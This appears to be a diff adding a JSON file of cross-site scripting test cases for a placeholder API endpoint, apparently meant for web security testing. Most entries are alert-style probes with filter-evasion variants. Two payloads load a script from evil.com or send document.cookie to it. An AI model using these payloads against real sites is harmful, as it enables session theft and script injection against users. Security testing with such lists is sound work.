@@ -1,0 +1,386 @@
+[
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "<script>alert(1)</script>",
+    "description": "XSS test with payload: <script>alert(1)</script>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "<img src=x onerror=alert(1)>",
+    "description": "XSS test with payload: <img src=x onerror=alert(1)>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "<svg onload=alert(1)>",
+    "description": "XSS test with payload: <svg onload=alert(1)>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "<ScRiPt>alert(1)</ScRiPt>",
+    "description": "XSS test with payload: <ScRiPt>alert(1)</ScRiPt>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+    "description": "XSS test with payload: <script>alert(String.fromCharCode(88,83,83))</script>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "<img src=x onerror=alert&#40;1&#41;>",
+    "description": "XSS test with payload: <img src=x onerror=alert&#40;1&#41;>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "';alert(1);//",
+    "description": "XSS test with payload: ';alert(1);//",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "\"><script>alert(1)</script>",
+    "description": "XSS test with payload: \"><script>alert(1)</script>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "</textarea><script>alert(1)</script>",
+    "description": "XSS test with payload: </textarea><script>alert(1)</script>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "javascript:alert(1)//",
+    "description": "XSS test with payload: javascript:alert(1)//",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "<script>/* */alert(1)</script>",
+    "description": "XSS test with payload: <script>/* */alert(1)</script>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "#<script>alert(1)</script>",
+    "description": "XSS test with payload: #<script>alert(1)</script>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "?<script>alert(1)</script>",
+    "description": "XSS test with payload: ?<script>alert(1)</script>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "`${alert(1)}`",
+    "description": "XSS test with payload: `${alert(1)}`",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "javascript:alert(1)",
+    "description": "XSS test with payload: javascript:alert(1)",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "data:text/html,<script>alert(1)</script>",
+    "description": "XSS test with payload: data:text/html,<script>alert(1)</script>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "<script src=https://evil.com/xss.js></script>",
+    "description": "XSS test with payload: <script src=https://evil.com/xss.js></script>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>",
+    "description": "XSS test with payload: <img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "<iframe src=javascript:alert(1)></iframe>",
+    "description": "XSS test with payload: <iframe src=javascript:alert(1)></iframe>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "<details open ontoggle=alert(1)>",
+    "description": "XSS test with payload: <details open ontoggle=alert(1)>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "<marquee onstart=alert(1)>",
+    "description": "XSS test with payload: <marquee onstart=alert(1)>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "<script>alert(/XSS/)</script>",
+    "description": "XSS test with payload: <script>alert(/XSS/)</script>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "<script>confirm(1)</script>",
+    "description": "XSS test with payload: <script>confirm(1)</script>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  },
+  {
+    "host": "app.example.com",
+    "method": "GET",
+    "path": "/api/v1/users/{id}",
+    "auth_required": true,
+    "parameter": "input",
+    "payload": "<script>prompt(1)</script>",
+    "description": "XSS test with payload: <script>prompt(1)</script>",
+    "what_to_watch": [
+      "Script execution in response",
+      "Alert/prompt/confirm dialogs",
+      "Error messages revealing filtering",
+      "Reflection in HTML context",
+      "DOM manipulation"
+    ]
+  }
+]
